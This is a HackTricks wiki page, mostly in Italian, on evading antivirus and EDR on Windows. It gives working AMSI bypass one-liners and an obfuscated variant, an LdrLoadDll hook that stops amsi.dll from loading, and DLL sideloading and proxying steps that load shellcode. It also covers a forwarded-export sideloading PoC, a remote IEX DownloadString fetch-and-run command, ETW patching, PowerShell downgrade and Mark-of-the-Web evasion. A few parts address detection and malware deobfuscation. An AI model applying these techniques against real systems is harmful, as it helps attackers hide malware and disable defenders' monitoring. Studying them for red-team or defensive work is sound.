# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per fermare il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare il funzionamento di Windows Defender fingendo un altro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodologia di evasione AV**

Attualmente, gli AV usano diversi metodi per verificare se un file è maligno o meno: static detection, dynamic analysis e, per gli EDR più avanzati, behavioural analysis.

### **Static detection**

La static detection si ottiene segnalando stringhe note maligne o array di byte in un binario o script, ed estraendo anche informazioni dal file stesso (es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare strumenti pubblici noti può farti rilevare più facilmente, poiché probabilmente sono stati analizzati e segnalati come maligni. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se crittografi il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di qualche tipo di loader per decrittare ed eseguire il programma in memoria.

- **Obfuscation**

A volte tutto ciò che serve è cambiare alcune stringhe nel tuo binario o script per superare l'AV, ma questo può richiedere molto tempo a seconda di cosa stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi strumenti, non ci saranno firme note malevole, ma questo richiede molto tempo e sforzo.

> [!TIP]
> Un buon modo per controllare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Sostanzialmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente; in questo modo può dirti esattamente quali sono le stringhe o i byte segnalati nel tuo binario.

Ti consiglio vivamente di guardare questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) su AV Evasion pratico.

### **Dynamic analysis**

La dynamic analysis è quando l'AV esegue il tuo binario in una sandbox e osserva attività maligne (es. provare a decrittare e leggere le password del browser, effettuare un minidump su LSASS, ecc.). Questa parte può essere un po' più complicata da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare la dynamic analysis degli AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il workflow dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep a seconda di come è implementato.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse a disposizione (es. < 2GB RAM), altrimenti rallenterebbero la macchina dell'utente. Qui puoi anche essere molto creativo, per esempio controllando la temperatura della CPU o anche la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi prendere di mira un utente la cui workstation è joinata al dominio "contoso.local", puoi fare un controllo sul dominio del computer per vedere se corrisponde a quello specificato; se non corrisponde, puoi far uscire il tuo programma.

Risulta che il computername della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione; se il nome è HAL9TH, significa che sei dentro la sandbox di Defender, quindi puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Alcuni altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per andare contro le Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev canale</p></figcaption></figure>

Come detto prima in questo post, gli **strumenti pubblici** prima o poi **verranno rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? O potresti usare un progetto diverso, meno conosciuto e che faccia comunque il dump di LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei, se non il più segnalato pezzo di malware dagli AV e dagli EDR; mentre il progetto è molto interessante, è anche un incubo cercare di aggirare gli AV usando mimikatz, quindi cerca alternative per quello che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di **disattivare l'invio automatico dei sample** in Defender, e per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere evasione a lungo termine. Se vuoi verificare se il tuo payload viene rilevato da un particolare AV, installalo in una VM, prova a disattivare l'invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, dai sempre la **priorità all'uso di DLLs per l'evasione**, secondo la mia esperienza i file DLL sono solitamente **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se il tuo payload ha un modo di eseguirsi come DLL, ovviamente).

Come possiamo vedere in questa immagine, un DLL Payload da Havoc ha un detection rate di 4/26 su antiscan.me, mentre il payload EXE ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando sia l'applicazione vittima che il(i) payload maligno(i) l'una accanto all'altra.

Puoi controllare i programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e lo seguente script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando mostrerà l'elenco dei programmi suscettibili a DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che cercano di caricare.

Consiglio vivamente di **esplorare personalmente DLL Hijackable/Sideloadable programs**, questa tecnica è piuttosto stealthy se eseguita correttamente, ma se usi programmi DLL Sideloadable noti pubblicamente, potresti essere facilmente scoperto.

Semplicemente posizionare una DLL malevola con il nome che un programma si aspetta di caricare non farà caricare il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: una DLL source code template e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento 0/26 su [antiscan.me](https://antiscan.me)! Lo definirei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

### Abusing Forwarded Exports (ForwardSideLoading)

I moduli Windows PE possono esportare funzioni che sono in realtà "forwarders": invece di puntare a codice, la voce di export contiene una stringa ASCII della forma `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il Windows loader:

- Carica `TargetDll` se non è già caricato
- Risolve `TargetFunc` da esso

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (e.g., ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato l'ordinamento di ricerca DLL normale, che include la directory del modulo che sta effettuando la risoluzione del forward.

Questo abilita una primitiva di sideloading indiretta: trova una DLL firmata che esporta una funzione forwardata verso un nome di modulo non KnownDLL, poi posiziona nella stessa directory quella DLL firmata insieme a una DLL controllata dall'attaccante chiamata esattamente come il modulo target forwardato. Quando l'export forwardato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite l'ordine di ricerca normale.

PoC (copy-paste):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona una `NCRYPTPROV.dll` malevola nella stessa cartella. Un DllMain minimale è sufficiente per ottenere l'esecuzione di codice; non è necessario implementare la funzione inoltrata per innescare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Innesca il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) carica il side-by-side `keyiso.dll` (signed)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader quindi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Hunting tips:
- Concentrati sui forwarded exports dove il modulo di destinazione non è un KnownDLL. I KnownDLLs sono elencati sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Idee per rilevamento/difesa:
- Monitora LOLBins (es. rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Genera un alert su catene processo/modulo come: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` in percorsi scrivibili dall'utente
- Applica politiche di code integrity (WDAC/AppLocker) e nega write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto col topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo strumento; se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevazione di EXE, COM, MSI, o installazione di ActiveX)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Poiché AMSI lavora principalmente con rilevamenti statici, modificare gli script che cerchi di caricare può essere un buon modo per evadere il rilevamento.

Tuttavia, AMSI ha la capacità di rimuovere l'offuscamento dagli script anche se questi hanno più livelli, quindi l'obfuscation potrebbe essere una scelta sbagliata a seconda di come viene fatta. Questo rende l'evasione non così immediata. A volte, però, basta cambiare un paio di nomi di variabili e sei a posto, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo di powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche eseguendo come utente non privilegiato. A causa di questa debolezza nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione AMSI.

**Forcing an Error**

Forzare l'inizializzazione di AMSI a fallire (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per evitarne un uso più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una riga di codice powershell per rendere AMSI inutilizzabile per l'attuale processo powershell. Questa riga è ovviamente stata segnalata dallo stesso AMSI, quindi è necessaria qualche modifica per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG; in questo modo il risultato della scansione reale restituirà 0, che viene interpretato come risultato pulito.

> [!TIP]
> Per una spiegazione più dettagliata, leggi https://rastamouse.me/memory-patching-amsi-bypass/.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Bloccare AMSI impedendo il caricamento di amsi.dll (LdrLoadDll hook)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nel piazzare un user‑mode hook su `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non vengono eseguite scansioni per quel processo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e loader personalizzati (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio di script via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti di riga di comando lunghi.
- Visto utilizzato da loader eseguiti tramite LOLBins (es. `regsvr32` che chiama `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Rimuovere la firma rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la firma AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della firma AMSI e poi sovrascrivendola con istruzioni NOP, rimuovendola effettivamente dalla memoria.

**Prodotti AV/EDR che utilizzano AMSI**

Puoi trovare una lista di prodotti AV/EDR che utilizzano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionati da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che permette di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per auditing e troubleshooting, ma può anche essere un **problema per gli attaccanti che vogliono evadere il rilevamento**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Use Powershell version 2**: Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi farlo con: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una sessione PowerShell senza difese (questo è ciò che usa `powerpick` di Cobal Strike).


## Obfuscation

> [!TIP]
> Diverse obfuscation techniques si basano sull'encrypting dei dati, il che aumenta l'entropy del binary e facilita il rilevamento da parte di AVs e EDRs. Fai attenzione a questo e applica l'encryption solo alle sezioni specifiche del tuo code che sono sensibili o che devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà gli original namespaces, classes e variable names e decripterà le constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei campioni.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM] in grado di aumentare la sicurezza del software tramite [code obfuscation] e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, al momento della compilazione, obfuscated code senza usare alcuno strumento esterno e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di obfuscated operations generate dal C++ template metaprogramming framework che renderanno la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un x64 binary obfuscator in grado di offuscare diversi PE files, inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice metamorphic code engine per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation a grana fine per i linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi ed esegui alcuni eseguibili da internet.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione: le applicazioni raramente scaricate attivano SmartScreen avvisando e impedendo all'utente finale di eseguire il file (sebbene il file possa comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al momento del download di file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dello Zone.Identifier ADS per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i tuoi payload ottengano il Mark of The Web è impacchettarli dentro una sorta di container come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta i payload in container di output per evadere Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Simile a come AMSI viene disabilitato (bypassed), è anche possibile far sì che la funzione **`EtwEventWrite`** del processo user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare subito, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Caricare binari C# in memoria è noto da tempo ed è tuttora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci soltanto di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) fornisce già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nello **spawnare un nuovo processo sacrificial**, iniettare il tuo codice post-exploitation malevolo in quel nuovo processo, eseguire il codice malevolo e, una volta terminato, terminare il nuovo processo. Questo ha vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **fuori** dal nostro Beacon implant process. Questo significa che se qualcosa nella nostra azione di post-exploitation va storto o viene intercettato, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che c'è una **maggiore probabilità** di essere rilevati da **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice post-exploitation malevolo **nel proprio processo**. In questo modo puoi evitare di creare un nuovo processo che venga scansionato dall'AV, ma lo svantaggio è che se qualcosa va storto con l'esecuzione del tuo payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon** poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere di più sul caricamento di Assembly C#, dai un'occhiata a questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e al loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il video di S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi fornendo alla macchina compromessa l'accesso **all'ambiente dell'interprete installato sulla Attacker Controlled SMB share**.

Consentendo l'accesso agli Interpreter Binaries e all'ambiente sulla SMB share puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repo indica: Defender continua a scansionare gli script ma utilizzando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare le signature statiche**. Test con random un-obfuscated reverse shell scripts in questi linguaggi si sono dimostrati efficaci.

## TokenStomping

